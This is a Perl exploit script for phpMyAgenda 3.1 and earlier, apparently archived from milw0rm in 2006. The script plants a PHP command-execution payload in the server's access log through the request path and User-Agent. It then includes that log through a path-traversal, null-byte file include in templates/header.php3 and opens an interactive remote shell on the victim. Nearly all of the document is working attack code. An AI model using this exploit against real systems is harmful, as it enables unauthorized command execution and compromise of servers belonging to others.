<html><head><title>phpMyAgenda <= 3.1 (templates/header.php3) Local File Include Exploit</title></head><pre>#!/usr/bin/perl

use IO::Socket;
use LWP::Simple;

print &quot;\n&quot;;
print &quot;#################################################################\n&quot;;
print &quot;#                                                               #\n&quot;;
print &quot;# phpMyAgenda &lt; 3.1 Multiple Remote Vulnerabilities Exploit     #\n&quot;;
print &quot;# Bug found By : Ashiyane Corporation                           #\n&quot;;
print &quot;# Email: Nima Salehi    nima[at]ashiyane.ir                     #\n&quot;;
print &quot;# Web Site : www.Ashiyane.ir                                    #\n&quot;;
print &quot;#                                                               #\n&quot;;
print &quot;#################################################################\n&quot;;


if (@ARGV &lt; 3)
{
    print &quot;\n Usage: Ashiyane.pl [host] [path] [access.log path]&quot;;
    print &quot;\n EX : Ashiyane.pl www.victim.com /phpMyAgenda/ ../../../logs/access.log \n\n&quot;;
exit;
}


$host=$ARGV[0];
$path=$ARGV[1];
$accpath=$ARGV[2];


print &quot;Injecting some code in log files...\n&quot;;

$CODE=&quot;&lt;?php ob_clean();system(\$HTTP_COOKIE_VARS[cmd]);die;?&gt;&quot;;
$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot; Could not connect to host.\n\n&quot;;
print $socket &quot;GET &quot;.$path.$CODE.&quot; HTTP/1.1\r\n&quot;;
print $socket &quot;User-Agent: &quot;.$CODE.&quot;\r\n&quot;;
print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
print $socket &quot;Connection: close\r\n\r\n&quot;;
close($socket);


print &quot;Type Your Commands ( uname -a )\n&quot;;
print &quot;For Exiit Type END\n&quot;;
print &quot;IF not working try another access.log path\n\n&quot;;

print &quot;[shell] &quot;;$cmd = &lt;STDIN&gt;;

while($cmd !~ &quot;END&quot;) {
    $socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;Could not connect to host.\n\n&quot;;

    print $socket &quot;GET &quot;.$path.&quot;templates/header.php3?language=&quot;.$accpath.&quot;%00&amp;cmd=$cmd HTTP/1.1\r\n&quot;;
    print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
    print $socket &quot;Accept: */*\r\n&quot;;
    print $socket &quot;Connection: close\r\n\n&quot;;

    while ($raspuns = &lt;$socket&gt;)
    {
        print $raspuns;
    }

    print &quot;[shell] &quot;;
    $cmd = &lt;STDIN&gt;;
}

# milw0rm.com [2006-10-10]</pre></html>